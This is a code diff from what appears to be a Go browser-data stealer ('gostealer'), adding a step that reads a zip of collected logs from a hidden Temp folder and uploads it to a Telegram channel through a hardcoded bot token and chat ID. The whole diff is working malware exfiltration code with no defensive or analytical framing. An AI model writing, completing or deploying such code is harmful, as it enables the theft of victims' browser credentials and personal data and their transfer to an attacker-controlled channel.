@@ -8,9 +8,14 @@ import (
 	"github.com/4kord/gostealer/browsers"
 	"github.com/4kord/gostealer/utils"
 	"github.com/alexmullins/zip"
+	"github.com/joho/godotenv"
+
+	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 )
 
 func main() {
+	godotenv.Load()
+
 	logFolderPath := path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9")
 	wg := sync.WaitGroup{}
 	//Create folder structure
@@ -54,4 +59,27 @@ func main() {
 	}
 
 	//Send log
+	file, err := os.ReadFile(path.Join(os.Getenv("localappdata"), "Temp", "65AC86F1-FB92-41E6-B994-DD784CF9.zip"))
+	if err != nil {
+		panic(err)
+	}
+
+	bot, err := tgbotapi.NewBotAPI("1664618644:AAE7TvjRGvUagMxkulUclo5AD3BwUMul-i4")
+	if err != nil {
+		panic(err)
+	}
+
+	media := tgbotapi.NewInputMediaDocument(tgbotapi.FileBytes{
+		Name:  "log.zip",
+		Bytes: file,
+	})
+
+	bot.Send(tgbotapi.MediaGroupConfig{
+		ChatID:          -1001563265930,
+		ChannelUsername: "logs",
+
+		Media: []interface{}{
+			media,
+		},
+	})
 }
